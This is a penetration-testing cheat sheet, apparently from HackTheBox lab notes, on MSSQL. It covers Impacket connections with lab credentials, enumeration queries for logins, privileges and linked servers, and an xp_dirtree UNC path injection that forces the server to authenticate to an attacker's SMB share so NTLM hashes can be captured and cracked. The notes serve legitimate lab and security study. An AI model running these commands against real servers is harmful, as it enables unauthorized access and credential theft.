# MSSQL

## Connection

We can use Impacket to connect to a MSSQL server:

{% tabs %}
{% tab title="Windows Authentication" %}
```bash
$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
{% endtab %}

{% tab title="SQL Server Authentication" %}
```
impacket-mssqlclient PublicUser:GuestUserCantWrite1@escape
```
{% endtab %}
{% endtabs %}

## Enumeration

### Who Are We

```sql
# Get the SQL login
# The variable SYSTEM_USER contains the name of the SQL login for the current session
SQL> SELECT SYSTEM_USER;

# Database user we mapped to
SQL> SELECT USER_NAME();

# If we are memeber of role
SQL> SELECT IS_SRVROLEMEMBER('public');

# Windows user
SQL> SELECT suser_name();
```

### What Can We Do

```sql
SQL> SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');
```

### Accounts

```sql
# List users
SQL> SELECT name FROM master..syslogins;

# Admin user
SQL> SELECT name FROM master..syslogins WHERE sysadmin = '1';
```

### System Information

```sql
SQL> select @@version;

# Current database
SQL> SELECT DB_NAME();

# List databases
SQL> SELECT name FROM master..sysdatabases;

# Query server name
SQL> SELECT @@servername;

# Enumerate SQL Server links
SQL> SELECT srvname FROM sysservers; 
```

## Attacks

### UNC Path Injection

We can force the MSSQL server to authenticate with a SMB share we control to capture the NTLM authentication messages and crack it later.

```sql
SQL> EXEC master..xp_dirtree "\\<IP>\<SHARE>"
```

Related HackTheBox machines include:

* [Escape](../../hackthebox/windows/escape.md#unc-path-injection)
